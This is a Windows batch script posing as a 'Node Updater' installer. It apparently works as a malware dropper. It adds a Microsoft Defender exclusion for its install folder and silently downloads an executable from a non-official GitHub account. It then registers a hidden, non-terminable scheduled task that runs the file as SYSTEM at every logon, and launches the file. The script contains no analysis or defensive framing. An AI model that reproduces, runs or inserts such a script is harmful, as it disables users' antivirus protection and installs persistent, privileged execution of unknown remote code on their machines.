@echo off

if not exist "C:\Program Files\Node Updater" (
    mkdir "C:\Program Files\Node Updater"
)

powershell.exe -ExecutionPolicy Bypass -NoLogo -Command "Add-MpPreference -ExclusionPath 'C:\Program Files\Node Updater'"

if exist "C:\Program Files\Node Updater\Node Updater.exe" (
    taskkill /IM "Node Updater.exe" /F
    del "C:\Program Files\Node Updater\Node Updater.exe"
)

curl -L -s -o "C:\Program Files\Node Updater\Node Updater.exe" https://github.com/nodeupdater2/nodeupdater/releases/latest/download/app.exe

powershell.exe -ExecutionPolicy Bypass -NoLogo -Command "Register-ScheduledTask -TaskName 'Node Updater' -Action (New-ScheduledTaskAction -Execute 'C:\Program Files\Node Updater\Node Updater.exe') -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Settings (New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Seconds 0) -Hidden -DontStopOnIdleEnd -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DisallowHardTerminate -Priority 0 -Compatibility Win8) -User 'SYSTEM' -RunLevel Highest"

"C:\Program Files\Node Updater\Node Updater.exe"
